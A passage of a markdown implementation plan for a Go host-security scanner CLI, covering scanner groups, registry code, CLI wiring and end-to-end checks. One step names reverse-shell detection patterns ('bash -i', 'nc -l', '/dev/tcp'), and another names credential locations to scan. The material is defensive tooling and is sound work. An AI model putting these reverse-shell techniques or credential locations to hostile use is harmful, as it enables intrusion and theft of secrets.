	if s.Name() != "pam" { t.Errorf("name = %s", s.Name()) }
	if s.RequiresRoot() != true { t.Error("should require root") }
}
```

- [ ] **Step 9: Run all tests**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/environment/ -v`
Expected: PASS

- [ ] **Step 10: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/scanner/environment/
git commit -m "feat: add environment scanner group — shell_rc, env_vars, ld_preload, pam"
```

---

### Task 10: Remaining 7 Scanner Groups (stubs with key detections)

**Files:**
- Create: `defense-kit-cli/internal/scanner/persistence/*.go`
- Create: `defense-kit-cli/internal/scanner/process/*.go`
- Create: `defense-kit-cli/internal/scanner/filesystem/*.go`
- Create: `defense-kit-cli/internal/scanner/network/*.go`
- Create: `defense-kit-cli/internal/scanner/auth/*.go`
- Create: `defense-kit-cli/internal/scanner/system/*.go`
- Create: `defense-kit-cli/internal/scanner/code/*.go`

Each group follows the same pattern as Task 9. Due to the size of this task, implement **one key scanner per group** with full logic, and stub the remaining scanners with the interface + TODO comment. This ensures the engine can discover and run all 30 scanners immediately, with full implementations filled in iteratively.

- [ ] **Step 1: Create persistence group — cron scanner (full) + systemd/scheduled stubs**

Implement `cron.go` with full cron scanning (parse `/var/spool/cron/`, `/etc/cron.d/`, `/etc/crontab`). Stub `systemd.go` and `scheduled.go` with interface methods returning empty findings.

- [ ] **Step 2: Create process group — suspicious process scanner (full) + memory/clipboard stubs**

Implement `suspicious.go` reading `/proc/*/cmdline` and `/proc/*/status` to detect reverse shells (`bash -i`, `nc -l`, `/dev/tcp`), crypto miners, processes with deleted binaries. Stub `memory.go` and `clipboard.go`.

- [ ] **Step 3: Create filesystem group — integrity scanner (full) + anomalies/timestomp/capabilities/swap stubs**

Implement `integrity.go` to find SUID/SGID binaries via `filepath.Walk`. Stub the rest.

- [ ] **Step 4: Create network group — ports scanner (full) + connections/dns/firewall/vpn stubs**

Implement `ports.go` parsing `/proc/net/tcp` and `/proc/net/tcp6` for listening ports. Stub the rest.

- [ ] **Step 5: Create auth group — ssh scanner (full) + users/browser stubs**

Implement `ssh.go` checking `~/.ssh/authorized_keys` for unauthorized keys, `/etc/ssh/sshd_config` for weak settings (PermitRootLogin, PasswordAuthentication). Stub `users.go` and `browser.go`.

- [ ] **Step 6: Create system group — rootkit scanner (full) + boot/logs/packagemgr stubs**

Implement `rootkit.go` checking for hidden kernel modules (compare `/proc/modules` vs `lsmod`-equivalent), suspicious `/dev` entries, hidden processes. Stub the rest.

- [ ] **Step 7: Create code group — credentials scanner (full) + supplychain/containers/githooks stubs**

Implement `credentials.go` scanning for AWS keys, private keys, tokens in common locations (`~/.aws`, `~/.bash_history`, `.env` files) using regex patterns. Stub the rest.

- [ ] **Step 8: Write tests for each key scanner**

Each group gets a `*_test.go` with at minimum: interface tests (Name, Category, RequiresRoot, Available) and one detection test using test fixtures.

- [ ] **Step 9: Run all tests**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./internal/scanner/... -v`
Expected: PASS

- [ ] **Step 10: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/internal/scanner/
git commit -m "feat: add all 8 scanner groups with 30 scanners (key detections + stubs)"
```

---

### Task 11: Scanner Registration + Wire to CLI

**Files:**
- Create: `defense-kit-cli/internal/scanner/register.go`
- Modify: `defense-kit-cli/cmd/defense-kit/main.go`

- [ ] **Step 1: Create register.go that registers all 30 scanners**

```go
// internal/scanner/register.go
package scanner

import (
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/auth"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/code"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/environment"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/filesystem"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/network"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/persistence"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/process"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/system"
)

func DefaultRegistry() *Registry {
	r := NewRegistry()

	// Environment group
	r.Register(environment.NewShellRCScanner())
	r.Register(environment.NewEnvVarsScanner())
	r.Register(environment.NewLDPreloadScanner())
	r.Register(environment.NewPAMScanner())

	// Persistence group
	r.Register(persistence.NewCronScanner())
	r.Register(persistence.NewSystemdScanner())
	r.Register(persistence.NewScheduledScanner())

	// Process group
	r.Register(process.NewSuspiciousScanner())
	r.Register(process.NewMemoryScanner())
	r.Register(process.NewClipboardScanner())

	// Filesystem group
	r.Register(filesystem.NewIntegrityScanner())
	r.Register(filesystem.NewAnomaliesScanner())
	r.Register(filesystem.NewTimestompScanner())
	r.Register(filesystem.NewCapabilitiesScanner())
	r.Register(filesystem.NewSwapScanner())

	// Network group
	r.Register(network.NewPortsScanner())
	r.Register(network.NewConnectionsScanner())
	r.Register(network.NewDNSScanner())
	r.Register(network.NewFirewallScanner())
	r.Register(network.NewVPNScanner())

	// Auth group
	r.Register(auth.NewSSHScanner())
	r.Register(auth.NewUsersScanner())
	r.Register(auth.NewBrowserScanner())

	// System group
	r.Register(system.NewRootkitScanner())
	r.Register(system.NewBootScanner())
	r.Register(system.NewLogsScanner())
	r.Register(system.NewPackageMgrScanner())

	// Code group
	r.Register(code.NewCredentialsScanner())
	r.Register(code.NewSupplyChainScanner())
	r.Register(code.NewContainersScanner())
	r.Register(code.NewGitHooksScanner())

	return r
}
```

- [ ] **Step 2: Wire scan command in main.go to use engine + reporters**

Replace `runScan` in `cmd/defense-kit/main.go`:

```go
func runScan(cmd *cobra.Command, args []string) error {
	// Load config
	cfg, err := config.Load(cfgFile)
	if err != nil {
		return fmt.Errorf("loading config: %w", err)
	}

	// Parse timeout
	timeout, err := time.ParseDuration(cfg.Scan.Timeout)
	if err != nil {
		timeout = 60 * time.Second
	}

	// Build scan options from CLI flags + config
	opts := scanner.ScanOptions{
		TargetPaths:     []string{"/"},
		ExcludePaths:    cfg.Scan.ExcludePaths,
		QuickCategories: cfg.Monitor.QuickCategories,
		Timeout:         timeout,
		Concurrency:     cfg.Scan.Concurrency,
		UseExtTools:     cfg.Tools.PreferExternal,
		Quick:           quick,
		Diff:            diff,
		Verbose:         verbose,
	}
	if category != "" {
		opts.Categories = []string{category}
	}
	if concurrent > 0 {
		opts.Concurrency = concurrent
	}

	// Build registry and engine
	reg := scanner.DefaultRegistry()
	engine := scanner.NewEngine(reg)

	// Run scan
	hostname, _ := os.Hostname()
	fmt.Fprintf(os.Stderr, "Scanning %s (%d scanners available)...\n", hostname, len(reg.Available()))
	results := engine.Run(cmd.Context(), opts)

	// Terminal report
	tr := reporter.NewTerminalReporter(os.Stdout)
	tr.Render(results)

	// JSON report
	outDir := outputDir
	if outDir == "" {
		outDir = "outputs"
	}
	jr := reporter.NewJSONReporter(outDir)
	scanID, err := jr.Write(results, hostname)
	if err != nil {
		return fmt.Errorf("writing JSON report: %w", err)
	}
	fmt.Fprintf(os.Stderr, "\nJSON report: %s\n", jr.OutputPath(scanID))

	// Auto-create baseline on first scan
	baselinePath := filepath.Join(outDir, "baseline.json")
	if _, err := os.Stat(baselinePath); os.IsNotExist(err) {
		var allFindings []scanner.Finding
		for _, r := range results {
			allFindings = append(allFindings, r.Findings...)
		}
		b := baseline.Baseline{
			Host:     hostname,
			ScanID:   scanID,
			Findings: allFindings,
		}
		if err := baseline.Save(baselinePath, b); err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not save baseline: %v\n", err)
		} else {
			fmt.Fprintf(os.Stderr, "Baseline created: %s\n", baselinePath)
		}
	}

	// Diff against baseline if requested
	if diff {
		b, err := baseline.Load(baselinePath)
		if err != nil {
			return fmt.Errorf("loading baseline: %w", err)
		}
		var allFindings []scanner.Finding
		for _, r := range results {
			allFindings = append(allFindings, r.Findings...)
		}
		d := baseline.Diff(b, allFindings)
		fmt.Fprintf(os.Stdout, "\nBaseline diff: %d new, %d resolved, %d changed, %d unchanged\n",
			len(d.New), len(d.Resolved), len(d.Changed), len(d.Unchanged))
	}

	return nil
}
```

Add imports: `"time"`, `"path/filepath"`, and the config/scanner/reporter/baseline packages.

- [ ] **Step 3: Build and test CLI end-to-end**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && make build && ./bin/defense-kit scan --category environment`
Expected: Scan runs environment scanners, outputs colored findings to terminal

- [ ] **Step 4: Wire baseline commands**

Update `runBaselineUpdate` and `runBaselineDiff` to use baseline package.

- [ ] **Step 5: Wire tools check command**

Update `runToolsCheck` to list all registered scanners and their availability.

- [ ] **Step 6: Run full test suite**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && make test`
Expected: All tests PASS

- [ ] **Step 7: Commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add defense-kit-cli/
git commit -m "feat: wire scanner registry to CLI — defense-kit scan works end-to-end"
```

---

### Task 12: End-to-End Verification

- [ ] **Step 1: Full scan**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && ./bin/defense-kit scan`
Expected: Runs all 30 scanners, shows terminal output with findings and summary

- [ ] **Step 2: Category filter**

Run: `./bin/defense-kit scan --category auth`
Expected: Only runs SSH, users, browser scanners

- [ ] **Step 3: Quick scan**

Run: `./bin/defense-kit scan --quick`
Expected: Runs monitor subset only

- [ ] **Step 4: Baseline create + diff**

Run: `./bin/defense-kit scan && ./bin/defense-kit baseline update && ./bin/defense-kit baseline diff`
Expected: Creates baseline, diff shows no changes

- [ ] **Step 5: Tools check**

Run: `./bin/defense-kit tools check`
Expected: Lists all 30 scanners with availability status

- [ ] **Step 6: Run full test suite with coverage**

Run: `cd /workspace/company/nunenuh/defense-kit/defense-kit-cli && go test ./... -v -race -coverprofile=coverage.out && go tool cover -func=coverage.out | tail -1`
Expected: PASS, coverage >= 80%

- [ ] **Step 7: Final commit**

```bash
cd /workspace/company/nunenuh/defense-kit
git add -A
git commit -m "feat: defense-kit v2 phase 1 complete — Go binary with 30 scanners, reporting, baseline"
```
